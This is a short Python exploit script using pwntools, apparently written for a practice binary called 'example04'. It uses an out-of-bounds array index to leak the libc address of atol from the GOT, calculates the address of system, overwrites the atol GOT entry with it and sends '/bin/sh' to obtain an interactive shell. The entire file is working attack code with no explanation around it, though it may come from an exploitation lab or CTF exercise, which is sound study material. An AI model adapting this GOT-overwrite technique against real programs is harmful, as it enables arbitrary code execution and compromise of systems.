from pwn import *  # NOQA

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']


def write(what, where):
    p.sendlineafter('>', str(where))
    p.sendlineafter('>', str(what))


def read(where):
    p.sendlineafter('>', str(where))
    return int(p.recvline())


binary = ELF('./example04')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./example04')
gdb.attach(p)

atol_got = binary.symbols['got.atol']
numbers = binary.symbols['numbers']
offset = (atol_got - numbers) / 8

write(1, 1)
atol_leak = read(offset)

libc_base = atol_leak - libc.symbols['atol']
system_addr = libc_base + libc.symbols['system']

print(hex(atol_leak))
print(hex(system_addr))

write(system_addr, offset)

p.sendline('/bin/sh')

p.interactive()
